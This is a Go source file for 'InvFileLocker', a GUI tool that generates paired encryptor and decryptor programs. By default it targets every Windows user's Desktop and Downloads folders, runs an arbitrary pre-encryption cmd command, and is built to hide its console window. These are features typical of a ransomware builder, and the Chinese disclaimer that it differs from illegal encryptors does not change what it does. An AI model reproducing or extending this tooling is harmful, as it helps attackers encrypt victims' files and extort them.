package main

import (
	"fmt"
	"image/color"
	"strconv"
	"strings"

	fyne "fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/widget"
)

//go build -ldflags "-H=windowsgui" .\main.go .\constVar.go .\random.go .\generate.go .\file.go .\encrypt.go .\program_binary.go
//go run .\main.go .\constVar.go .\random.go .\generate.go .\file.go .\encrypt.go .\program_binary.go

func main() {
	a := app.New()
	w := a.NewWindow("InvFileLocker 文件加密")

	header := widget.NewLabel(`
.——————————.——.——.        .————.                .——.                
\—   —————/|——|  |   .——. |    |    .——.   .——. |  | —— .—————————. 
 |    ——)  |  |  | —/ —— \|    |   / —— \ / .——\|  |/ // —— \—  —— \
 |     \   |  |  |—\  ———/|    |——( <  > )  \———|    <\  ———/|  | \/
 \——.  /   |——|————/\——.  >——————. \————/ \——.  >——|— \\——.  >——|   
     \/                 \/        \/          \/     \/    \/   

InvFileLocker originally v` + VERSION)
	header.TextStyle.Monospace = true

	//关于列
	about_tips := widget.NewButton("关于本软件", func() {
		dialog.NewInformation("关于本软件", "InvFileLocker 的部分功能可能与某些不合法的加密器解密器类似，但实际上有本质区别，InvFileLocker 开发者团队坚决抵制任何犯罪行为，任何利用该软件谋取不正当利益的行为均与开发者无关. ", w).Show()
	})
	about_row := container.NewBorder(nil, nil, about_tips, nil, nil) //左右中

	//加密算法列
	aes_min_input_tips := widget.NewLabel("非对称/对称加密算法临界值:")
	aes_min_input_tips_tips := widget.NewButton("?", func() {
		dialog.NewInformation("非对称/对称加密算法临界值", "以 KB 为单位的值."+endll+"当文件大小小于该值时，使用不可逆的 RSA 算法加密文件，防止加密文件被逆向."+endll+"当文件大小小于该值时，使用快速的 AES 算法加密文件，避免文件加密速度过长"+endll+"如果你不知道这个是干嘛的，请保持默认", w).Show()
	})
	aes_min_input := widget.NewEntry()
	aes_min_input.SetPlaceHolder("文件大小大于该值，使用对称加密算法")
	aes_min_input.SetText("512")
	aes_min_input.Resize(fyne.NewSize(600, 600))
	aes_min_row := container.NewBorder(nil, nil, container.NewHBox(aes_min_input_tips, aes_min_input_tips_tips), widget.NewLabel(" KB"), aes_min_input) //左右中

	//选择路径遍历算法列
	trans_algo_tips := widget.NewLabel("路径遍历算法:")
	trans_algo_tips_tips := widget.NewButton("?", func() {
		dialog.NewInformation("路径遍历算法", "BFS算法：首先加密文件夹中的第一层文件，然后第二层，第三层...普遍推荐用户使用BFS算法，因为较为重要的文件一般处于文件夹外层."+endll+"DFS算法：可以将其简单地理解为逐个文件夹加密，首先加密完文件夹中第一个文件夹的所有文件，然后再加密第二个.", w).Show()
	})
	var trans_algo_bfs_choice *widget.Check
	trans_algo_bfs_choice = widget.NewCheck("BFS算法", func(value bool) {
		trans_algo_bfs_choice.Checked = true
	})
	trans_algo_bfs_choice.Checked = true
	var trans_algo_dfs_choice *widget.Check
	trans_algo_dfs_choice = widget.NewCheck("DFS算法(暂不支持)", func(value bool) {
		trans_algo_dfs_choice.Checked = false
	})
	trans_algo_dfs_choice.Checked = false
	trans_algo_row := container.NewHBox(trans_algo_tips, trans_algo_tips_tips, trans_algo_bfs_choice, trans_algo_dfs_choice)

	//是否开启多线程列
	multi_thread := widget.NewLabel("是否开启多线程同时加密(不建议):")
	multi_thread_start_choice := widget.NewCheck("", func(value bool) {})
	multi_thread_start_choice.Checked = false
	multi_thread_row := container.NewHBox(multi_thread, multi_thread_start_choice)

	//命令输入列
	cmd_input_tips := widget.NewLabel("请输入在加密前运行的命令:")
	cmd_input_tips_tips := widget.NewButton("?", func() {
		dialog.NewInformation("加密前运行的命令", "在加密器运行前，首先会在后台cmd中运行指定命令", w).Show()
	})
	cmd_input := widget.NewEntry()
	cmd_input.SetMinRowsVisible(12)
	cmd_input.SetText("start https://www.bilibili.com/video/BV1GJ411x7h7?verify=true")
	cmd_row := container.NewBorder(nil, nil, container.NewHBox(cmd_input_tips, cmd_input_tips_tips), nil, cmd_input)

	//路径输入列
	path_input_tips := widget.NewLabel("请在下面的输入框中输入要加密的路径，一行一个:")
	path_input_tips_tips := widget.NewButton("?", func() {
		dialog.NewInformation("输入要加密的路径", "在这里输入加密器加密的路径，一行一个. "+endll+"请注意，在此若您想匹配所有文件(例如 Windows 的 Users 一般不止一个，而您又不确定 Users 叫什么)时，请使用 * 通配符. "+endll+"例如 C:\\Users\\*\\Desktop，他会匹配到所有 Users：C:\\Users\\leeyange\\Desktop、C:\\Users\\li\\Desktop、C:\\Users\\Administrator\\Desktop", w).Show()
	})
	path_input := widget.NewMultiLineEntry()
	path_input.SetMinRowsVisible(12)
	path_input.SetText("C:\\Users\\*\\Desktop" + endl + "C:\\Users\\*\\Downloads" + endl + "C:\\tmp")
	path_row := container.NewVBox(container.NewHBox(path_input_tips, path_input_tips_tips), path_input)

	//错误/正确信息提示列
	error_tips := canvas.NewText("", color.NRGBA{0x80, 0, 0, 0xff})
	error_tips_multiline := widget.NewLabel("")
	error_tips_row := container.NewVBox(error_tips, error_tips_multiline)

	//"生成加密器和解密器" 按钮列
	final_button := widget.NewButton("生成加密器和解密器", func() {
		error_tips.Text = ""
		error_tips_multiline.SetText("")

		aes_min, err := strconv.Atoi(aes_min_input.Text)
		if err != nil || aes_min < 0 {
			error_tips.Text = "*错误：临界值输入错误，请输入正确的正整数值"
			error_tips.Color = color.NRGBA{0x80, 0, 0, 0xff}
			return
		}
		if aes_min >= 2<<49 {
			error_tips.Text = "*错误：临界值输入错误，不得大于 1 PB (1024 ^ 5)"
			error_tips.Color = color.NRGBA{0x80, 0, 0, 0xff}
			return
		}
		paths := strings.Trim(path_input.Text, endl)
		path_slice := strings.Split(paths, endl)

		error_tips_multiline_text := ""
		if len(path_slice) >= 40 {
			error_tips.Text = "*错误：最多只能加密 40 个路径"
			error_tips.Color = color.NRGBA{0x80, 0, 0, 0xff}
			return
		}
		for _, path := range path_slice {
			error_tips_multiline_text += "*获取到路径：" + path + endl
			if len(str_decode2byte(path)) >= 2048 {
				error_tips.Text = "*错误：各路径长度不得大于 2047"
				error_tips.Color = color.NRGBA{0x80, 0, 0, 0xff}
				return
			}
		}

		if len(str_decode2byte(cmd_input.Text)) >= 4096 {
			error_tips.Text = "*错误：CMD 长度不能大于 4095"
			error_tips.Color = color.NRGBA{0x80, 0, 0, 0xff}
			return
		}

		encryptor_path, decryptor_path, _, err := generate(path_slice, aes_min, cmd_input.Text, multi_thread_start_choice.Checked)
		if err != nil {
			error_tips_multiline.SetText(error_tips_multiline_text)
			error_tips.Text += "*生成失败: " + err.Error()
		} else {
			error_tips_multiline.SetText(error_tips_multiline_text)
			error_tips.Text += fmt.Sprintf("*生成成功，加密器路径: %s, 解密器路径: %s", encryptor_path, decryptor_path)
			error_tips.Color = color.NRGBA{0, 0x80, 0, 0xff}
		}
	})

	w.SetContent(container.NewVBox(
		header,
		about_row,
		aes_min_row,
		trans_algo_row,
		multi_thread_row,
		cmd_row,
		path_row,
		final_button,
		error_tips_row,
	))
	w.Resize(fyne.NewSize(600, 600))
	w.ShowAndRun()

}
